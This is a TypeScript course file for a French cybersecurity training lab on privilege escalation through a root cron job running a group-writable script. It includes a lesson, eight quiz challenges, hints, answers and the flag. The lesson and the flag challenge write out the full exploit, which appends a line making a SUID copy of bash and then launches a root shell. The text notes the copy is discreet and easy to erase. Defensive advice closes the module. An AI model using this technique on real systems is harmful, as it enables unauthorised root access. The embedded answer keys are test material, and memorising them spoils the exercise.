import type { CourseSeed } from "../../../types";

/** Cyber · Pratique — Module 5 : élévation de privilèges via cron. Lab mono-conteneur. */
export const module5CronPrivesc: CourseSeed[] = [
  {
    slug: "prat-cron-privesc",
    title: "Élévation de privilèges via cron",
    checkpoint: "prat-privesc-lateral",
    codename: "Silent Wait",
    domain: "Élévation de privilèges",
    theme: "grid",
    icon: "Cog",
    accent: "#B8794F",
    order: 5,
    difficulty: "hard",
    summary:
      "Cinquième lab réel : une élévation de privilèges « à retardement ». Toujours en tant que « stagiaire », tu découvres qu'une tâche cron tourne en root chaque minute et exécute un script que ton groupe peut modifier. Tu y glisses ton payload… puis tu attends le bon top de minute pour récolter un shell root.",
    objectives: [
      "Énumérer les tâches planifiées : crontab utilisateur vs cron système (/etc/cron.d)",
      "Repérer un script exécuté en root mais modifiable par un groupe non privilégié",
      "Confirmer son appartenance de groupe (groups) et le droit d'écriture",
      "Concevoir un payload SUID (copie de /bin/bash) déclenché par le cron",
      "Comprendre l'élévation « avec latence » et la parade (moindre privilège)",
    ],
    sandbox: {
      attackerImage: "cyberace/module5-cron-privesc:latest",
      // targetImage absent — mode mono-conteneur, comme le Module 3.
      ttlSec: 1500, // plus long : il faut parfois patienter jusqu'à une minute pour le cron
      attackerCapAdd: [],
      ports: [{ containerPort: 7681, label: "Terminal web (ttyd)" }],
    },
    lesson: `# ⚙️ Élévation de privilèges via cron — Silent Wait

Le Module 3 t'a fait passer root **instantanément** (un SUID mal placé). Ici, la faille est aussi puissante, mais elle exige une qualité en plus : la **patience**. Le vecteur est disponible tout de suite, mais l'exécution privilégiée n'arrive **qu'au prochain top de minute**. 🏎️

---

## 🧭 Le briefing

> Tu es toujours **\`stagiaire\`** sur une machine mal durcie. Cette fois, l'administrateur a laissé tourner une **tâche planifiée (cron)** qui s'exécute **en root, chaque minute**. Ton travail : découvrir cette tâche, comprendre pourquoi elle est exploitable, y injecter ton **payload**, et devenir **root**.
>
> ⚠️ **Prévenu : cette attaque a de la latence.** Une fois ton action effectuée, **patiente jusqu'à la prochaine minute** pour que la tâche planifiée s'exécute. **Ce n'est PAS un bug si rien ne se passe immédiatement** — c'est le principe même du module.

**Comment jouer :** clique sur **« Démarrer le lab »** ; le terminal te dépose en shell **\`stagiaire\`**. Énumère, exploite, **attends**, récolte.

---

## 1. Rappel : cron, le planificateur de tâches ⏰

**cron** exécute des commandes **automatiquement**, à intervalles définis. Deux niveaux à distinguer :

- **crontab utilisateur** : les tâches **personnelles** d'un utilisateur, listées par \`crontab -l\`. Elles s'exécutent avec **ses** droits.
- **cron système** : les tâches définies dans **\`/etc/crontab\`** et **\`/etc/cron.d/\`**. Particularité : chaque ligne précise **l'utilisateur** sous lequel la tâche tourne — souvent **root**.

\`\`\`
   /etc/cron.d/cleanup-logs :
   * * * * *  root  /opt/maintenance/cleanup-logs.sh
   │ │ │ │ │   │        └── la commande exécutée…
   │ │ │ │ │   └── …EN TANT QUE root
   └─┴─┴─┴─┴── "* * * * *" = chaque minute
\`\`\`

> 🧭 Réflexe d'énumération : \`crontab -l\` ne montre **que tes** tâches (vide, ici). Le vrai trésor est dans **\`/etc/cron.d/\`** — les tâches **système**, souvent en **root**.

---

## 2. La faille : un script root modifiable par ton groupe 🎯

La tâche exécute \`/opt/maintenance/cleanup-logs.sh\` **en root** chaque minute. Regardons ses permissions :

\`\`\`bash
ls -la /opt/maintenance/cleanup-logs.sh
# -rw-rw-r-- 1 root maintainers ... cleanup-logs.sh
#     ▲▲             ▲
#     ││             └── groupe propriétaire : maintainers
#     │└── le GROUPE a le droit d'ÉCRITURE (w)
#     └── (rw pour le propriétaire root)
\`\`\`

Le script appartient au groupe **\`maintainers\`**, qui a le droit d'**écriture** (mode **664**). Or… **tu es dans ce groupe** :

\`\`\`bash
groups
# stagiaire maintainers   ← tu en fais partie (ajouté "temporairement", jamais retiré)
\`\`\`

**Conclusion** : tu peux **modifier** un script qui sera **exécuté en root** dans moins d'une minute. C'est une **élévation de privilèges** en puissance — il ne reste qu'à écrire le bon **payload**.

> 🧠 La combinaison mortelle : **(1)** un script lancé en **root** par cron, **(2)** que tu peux **écrire** (via un groupe mal attribué). Ni l'un ni l'autre n'est dangereux seul ; **ensemble**, c'est un root garanti.

---

## 3. Le payload : un /bin/bash SUID 💣

Comment transformer « je peux écrire un script root » en « j'ai un shell root » ? On fait **exécuter par root** une commande qui nous **laisse un accès** root **après coup**. La technique classique : faire **copier \`/bin/bash\`** et le rendre **SUID**.

\`\`\`bash
cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
\`\`\`

- Exécutée **par root** (via cron), cette ligne crée \`/tmp/rootbash\`, **propriété de root**, avec le **bit SUID**.
- Ensuite, **n'importe qui** (dont toi, stagiaire) peut lancer \`/tmp/rootbash -p\` et obtenir un **shell root** — exactement le mécanisme SUID du Module 3, et le **\`-p\`** qui **préserve les privilèges effectifs**.

### Pourquoi copier /bin/bash plutôt que le modifier sur place ?

On **ne rend jamais \`/bin/bash\` SUID directement**. Copier vers \`/tmp/rootbash\` est **plus propre** (on ne touche pas à un binaire **système partagé** dont dépend toute la machine), **plus discret**, et **réversible** (un simple \`rm /tmp/rootbash\` efface la trace). Rendre \`/bin/bash\` lui-même SUID serait grossier, dangereux, et immédiatement suspect.

### Pourquoi un binaire, et pas un script ?

Rappel du Module 3 : le noyau **ignore le SUID sur les scripts** interprétés, mais **l'honore sur les binaires compilés**. \`/bin/bash\` **est** un binaire compilé → le SUID **fonctionne**. C'est pour ça qu'on copie **bash** (et pas un script maison).

---

## 4. L'exploitation, pas à pas ⏳

\`\`\`bash
# 1) J'ajoute mon payload à la fin du script (autorisé : je suis dans maintainers)
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/maintenance/cleanup-logs.sh

# 2) J'ATTENDS le prochain top de minute (jusqu'à ~60 s). cron exécute le script EN ROOT.
#    → il crée /tmp/rootbash SUID-root.

# 3) Je vérifie que le SUID est bien là :
ls -la /tmp/rootbash          # -rwsr-xr-x  root root ... /tmp/rootbash

# 4) Je lance mon shell root et je lis le flag :
/tmp/rootbash -p
whoami                        # root
cat /root/flag.txt
\`\`\`

> ⚠️ **La patience fait partie de l'exercice.** Si \`/tmp/rootbash\` n'existe pas encore, c'est que **la minute n'est pas passée** — attends, ne conclus pas à un échec.

---

## 5. La parade 🛡️

Cette attaque n'a été possible que parce que **\`stagiaire\` appartenait à \`maintainers\`** sans **aucune raison réelle** (« un accès temporaire jamais retiré »). Le **principe du moindre privilège** (*least privilege*) l'aurait empêchée : n'accorder à chaque compte **que** les droits **strictement nécessaires**, et **retirer** les accès temporaires dès qu'ils ne servent plus.

Autres bonnes pratiques : les scripts lancés par cron **root** doivent être **écrits uniquement par root** (mode **\`root:root 755\`**, pas de groupe en écriture), et on **audite** régulièrement les appartenances de groupe et les permissions des tâches planifiées.

---

## 🎯 Ta mission (résumé)

1. **Énumère** : \`crontab -l\` (vide), puis \`/etc/cron.d/\` (le trésor).
2. **Vérifie** : permissions du script + tes groupes (\`groups\`).
3. **Injecte** le payload, **attends la minute**, lance \`/tmp/rootbash -p\`, lis le flag.

## 🧠 À retenir

- **cron** : \`crontab -l\` = tâches **utilisateur** (tes droits) ; **\`/etc/cron.d/\`** + \`/etc/crontab\` = tâches **système**, souvent en **root**.
- **Faille** : un script exécuté **en root** par cron **mais modifiable** par un groupe non privilégié (ici \`maintainers\`, mode **664**) dont fait partie **stagiaire** → écriture d'un payload exécuté en root.
- **Payload** : \`cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\` → root crée un **bash SUID** ; puis \`/tmp/rootbash -p\` donne un **shell root** (le **\`-p\`** préserve les privilèges).
- **Copier** \`/bin/bash\` (jamais le rendre SUID **sur place**) : plus propre, discret, réversible. **Binaire** compilé → le SUID est **honoré** (un script ne le serait pas — cf. Module 3).
- **Latence** : l'exécution privilégiée n'arrive **qu'au prochain tick cron** (≤ 60 s). Patienter fait partie de l'exploitation.
- **Parade** : **moindre privilège** (pas d'appartenance de groupe injustifiée), scripts cron root en **root:root 755**, audit des permissions et des groupes.`,
    badge: {
      id: "badge-prat-cron",
      name: "Patient Opportuniste",
      icon: "Cog",
      description: "A attendu la bonne minute pour transformer un groupe oublié en accès root.",
    },
    challenges: [
      {
        id: "prat-cron-t1",
        title: "Tâches planifiées personnelles",
        order: 1,
        difficulty: "easy",
        type: "text",
        prompt: `## ⏰ Tes tâches planifiées

Démarre le lab (shell \`stagiaire\`). Premier réflexe : regarder **tes** tâches planifiées :

\`\`\`bash
crontab -l
\`\`\`

Ici, c'est **vide** — normal, ce n'est pas le bon endroit à regarder (tu verras le bon au pas suivant).

**Question :** quelle **commande** liste les tâches planifiées de l'**utilisateur courant** ?`,
        points: 50,
        timeLimitSec: 250,
        hints: [],
        answer: "crontab -l",
        accept: ["crontab", "crontab -l -u stagiaire"],
        caseSensitive: false,
        explanation: `**\`crontab -l\`** liste les tâches planifiées de l'utilisateur **courant** (elles s'exécuteraient avec **ses** droits). Ici c'est vide : les tâches intéressantes ne sont pas côté utilisateur, mais côté **cron système** (\`/etc/cron.d/\`), que tu vas inspecter juste après.`,
        tags: ["cron", "enumeration", "crontab"],
      },
      {
        id: "prat-cron-t2",
        title: "Tâches système",
        order: 2,
        difficulty: "easy",
        type: "text",
        prompt: `## 🗂️ Le cron système

Les tâches **système** vivent dans \`/etc/crontab\` et \`/etc/cron.d/\`. Inspecte ce dernier :

\`\`\`bash
ls -la /etc/cron.d/
cat /etc/cron.d/*
\`\`\`

Lis la ligne : elle précise l'**horaire**, l'**utilisateur** d'exécution, et la **commande**.

**Question :** quel **script** est exécuté automatiquement **en root**, **chaque minute**, par le cron système ?`,
        points: 100,
        timeLimitSec: 300,
        hints: [],
        answer: "/opt/maintenance/cleanup-logs.sh",
        accept: ["cleanup-logs.sh", "/opt/maintenance/cleanup-logs.sh"],
        caseSensitive: true,
        explanation: `Le fichier \`/etc/cron.d/cleanup-logs\` contient \`* * * * * root /opt/maintenance/cleanup-logs.sh\` : ce script tourne **en root**, **chaque minute**. Un script exécuté en root est une **cible d'élévation** de premier choix — à condition de pouvoir le **modifier** (tâche suivante).`,
        tags: ["cron", "cron.d", "root"],
      },
      {
        id: "prat-cron-t3",
        title: "Vérifier les permissions",
        order: 3,
        difficulty: "medium",
        type: "text",
        prompt: `## 🔍 Qui peut écrire ce script ?

Un script root n'est exploitable que si **tu peux le modifier**. Vérifie ses permissions :

\`\`\`bash
ls -la /opt/maintenance/cleanup-logs.sh
# -rw-rw-r-- 1 root <groupe> ...
\`\`\`

Observe le **groupe propriétaire** et le **droit d'écriture** du groupe (le 2ᵉ \`w\`).

**Question :** à quel **groupe** appartient ce script (celui qui a le droit d'écriture dessus) ?`,
        points: 150,
        timeLimitSec: 350,
        hints: [
          { text: "La commande « groups » (sans argument) te dit à quels groupes TOI tu appartiens déjà — compare avec le groupe du fichier.", cost: 15 },
        ],
        answer: "maintainers",
        caseSensitive: false,
        explanation: `Le script est \`root:maintainers\` en mode **664** : le groupe **\`maintainers\`** a le droit d'**écriture**. C'est la moitié de la faille — l'autre moitié, c'est que **tu appartiens** à ce groupe (tâche 4). Un script root **modifiable par un groupe non privilégié** est une porte ouverte vers root.`,
        tags: ["cron", "permissions", "groupe"],
      },
      {
        id: "prat-cron-t4",
        title: "Confirmer son appartenance",
        order: 4,
        difficulty: "easy",
        type: "text",
        prompt: `## 👥 Suis-je dans le bon groupe ?

Reste à confirmer que **tu** fais partie du groupe qui peut écrire le script :

\`\`\`bash
groups
\`\`\`

**Question :** quelle **commande** affiche la liste des **groupes** de l'utilisateur courant ?`,
        points: 100,
        timeLimitSec: 200,
        hints: [],
        answer: "groups",
        accept: ["id -Gn", "id"],
        caseSensitive: true,
        explanation: `**\`groups\`** affiche les groupes de l'utilisateur courant : tu y vois **\`maintainers\`** — tu peux donc **écrire** dans \`cleanup-logs.sh\`. Les deux moitiés de la faille sont réunies : un script **exécuté en root** que **tu peux modifier**. Place au payload.`,
        tags: ["cron", "groups", "appartenance"],
      },
      {
        id: "prat-cron-t5",
        title: "Concevoir le payload",
        order: 5,
        difficulty: "medium",
        type: "mcq",
        prompt: `## 💣 Concevoir le payload

La technique : faire exécuter par root \`cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\`.

**Question :** pourquoi copie-t-on \`/bin/bash\` vers \`/tmp/rootbash\` avant de le rendre SUID, plutôt que de rendre directement \`/bin/bash\` SUID **sur place** ?`,
        points: 200,
        timeLimitSec: 400,
        hints: [],
        options: [
          "Pour éviter de modifier un binaire système partagé — plus propre, plus discret, et facilement réversible en le supprimant",
          "Parce que /bin/bash ne peut techniquement pas recevoir le bit SUID",
          "Parce que cron interdit l'exécution directe de /bin/bash",
          "Parce que /tmp est le seul répertoire accessible en écriture par cron",
        ],
        answer: 0,
        explanation: `On **copie** \`/bin/bash\` pour ne **pas toucher** au binaire **système partagé** (dont dépend toute la machine) : c'est plus **propre**, plus **discret**, et **réversible** (\`rm /tmp/rootbash\`). Techniquement, \`/bin/bash\` **peut** recevoir le SUID (c'est un binaire compilé) — mais le rendre SUID sur place serait grossier et dangereux.`,
        tags: ["cron", "payload", "suid"],
      },
      {
        id: "prat-cron-t6",
        title: "Exploiter (flag)",
        order: 6,
        difficulty: "hard",
        type: "text",
        prompt: `## ⏳ Exploiter (flag)

Assemble l'attaque, puis **patiente** :

\`\`\`bash
# 1) Ajoute le payload à la fin du script (tu es dans maintainers → autorisé)
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/maintenance/cleanup-logs.sh

# 2) ATTENDS la prochaine minute (jusqu'à ~60 s) : cron exécute le script EN ROOT
# 3) Vérifie l'apparition du bash SUID, puis lance-le :
ls -la /tmp/rootbash          # -rwsr-xr-x root root ...
/tmp/rootbash -p
cat /root/flag.txt
\`\`\`

⚠️ Si \`/tmp/rootbash\` n'existe pas encore, **la minute n'est pas passée** — attends, ce n'est pas un échec.

**Question :** colle le **flag** contenu dans \`/root/flag.txt\`.`,
        points: 300,
        timeLimitSec: 800,
        hints: [
          { text: "Patience : après avoir modifié le script, il faut ATTENDRE le prochain top de minute pour que cron l'exécute. Rien n'apparaît avant.", cost: 20 },
          { text: "Ligne exacte à ajouter : echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/maintenance/cleanup-logs.sh — puis attends, puis /tmp/rootbash -p", cost: 35 },
        ],
        answer: "CYBERACE{cron_ecriture_groupe_racine}",
        caseSensitive: true,
        explanation: `Le cron a exécuté **en root** ton payload, créant \`/tmp/rootbash\` **SUID-root**. \`/tmp/rootbash -p\` (le \`-p\` préserve les privilèges) t'ouvre alors un **shell root**, qui lit \`/root/flag.txt\` → \`CYBERACE{cron_ecriture_groupe_racine}\`. Un droit d'écriture de groupe mal placé sur un script cron root a suffi.`,
        tags: ["cron", "exploitation", "flag"],
      },
      {
        id: "prat-cron-t7",
        title: "Nommer la faille",
        order: 7,
        difficulty: "medium",
        type: "mcq",
        prompt: `## 🏷️ Nommer la faille

**Question :** comment qualifie-t-on ce type de vulnérabilité ?`,
        points: 150,
        timeLimitSec: 300,
        hints: [],
        options: [
          "Une élévation de privilèges via une tâche planifiée dont les fichiers exécutés ne sont pas correctement cloisonnés",
          "Une attaque par déni de service",
          "Une élévation de privilèges par débordement de tampon",
          "Une attaque de type ARP spoofing",
        ],
        answer: 0,
        explanation: `C'est une **élévation de privilèges via une tâche planifiée (cron)** dont les **fichiers exécutés sont mal cloisonnés** : un script lancé en root, mais modifiable par un utilisateur non privilégié. Rien à voir avec un déni de service, un débordement de tampon ou de l'ARP spoofing — la cause est une **permission trop laxiste** sur un script automatisé.`,
        tags: ["cron", "classification", "privesc"],
      },
      {
        id: "prat-cron-t8",
        title: "Synthèse défensive",
        order: 8,
        difficulty: "easy",
        type: "text",
        prompt: `## 🛡️ Synthèse défensive

Tout est parti du fait que \`stagiaire\` appartenait à \`maintainers\` **sans besoin réel**.

**Question :** en **deux mots**, quel **principe de sécurité d'accès** aurait empêché cette appartenance injustifiée ?`,
        points: 50,
        timeLimitSec: 250,
        hints: [],
        answer: "moindre privilège",
        accept: ["principe du moindre privilège", "least privilege", "moindre privilege"],
        caseSensitive: false,
        explanation: `Le **principe du moindre privilège** : n'accorder à chaque compte **que** les droits **strictement nécessaires**, et **retirer** les accès temporaires dès qu'ils ne servent plus. Appliqué ici, \`stagiaire\` n'aurait jamais été dans \`maintainers\`, et le script cron root serait resté inatteignable.`,
        tags: ["cron", "moindre-privilege", "defense"],
      },
    ],
  },
];
